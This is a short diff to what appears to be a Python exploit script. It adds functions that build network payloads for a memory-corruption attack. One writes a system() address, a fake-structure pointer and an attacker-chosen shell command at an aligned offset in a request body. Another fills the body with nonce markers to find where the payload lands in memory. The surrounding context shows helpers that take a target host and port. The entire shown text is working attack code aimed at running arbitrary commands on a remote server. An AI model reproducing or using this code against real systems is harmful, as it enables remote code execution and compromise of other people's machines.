@@ -52,6 +52,40 @@ def make_body(cmd, data_addr, system_addr):
     return payload + b'\x41' * (BODY_LEN - len(payload))
 
 
+def make_body_at_offset(cmd, fake_addr, system_addr, offset):
+    if offset < 0 or offset % 8:
+        print(f"[!] Fake cleanup offset must be non-negative and 8-byte aligned: {offset}")
+        sys.exit(1)
+
+    cmd_bytes = cmd.encode('utf-8') + b'\x00'
+    payload_len = offset + 24 + len(cmd_bytes)
+    if payload_len > BODY_LEN:
+        print(f"[!] Command too long for offset {offset} (body={payload_len}, max={BODY_LEN})")
+        sys.exit(1)
+
+    body = bytearray(b'\x41' * BODY_LEN)
+    struct.pack_into('<QQQ', body, offset, system_addr, fake_addr + 24, 0)
+    body[offset + 24:offset + 24 + len(cmd_bytes)] = cmd_bytes
+    return bytes(body)
+
+
+def make_slot_probe_body(nonce, marker_offset=24, stride=8):
+    if len(nonce) != 6:
+        print("[!] Slot probe nonce must be exactly 6 bytes")
+        sys.exit(1)
+    if marker_offset < 2 or stride < 8 or stride % 8:
+        print("[!] Invalid slot probe geometry")
+        sys.exit(1)
+
+    marker_len = 8
+    body = bytearray(b'\x41' * BODY_LEN)
+    max_slot = BODY_LEN - marker_offset - marker_len
+    for off in range(0, max_slot + 1, stride):
+        struct.pack_into('<H', body, off + marker_offset, off)
+        body[off + marker_offset + 2:off + marker_offset + marker_len] = nonce
+    return bytes(body)
+
+
 def wait_alive(host, port, timeout=30):
     for _ in range(timeout):
         try:
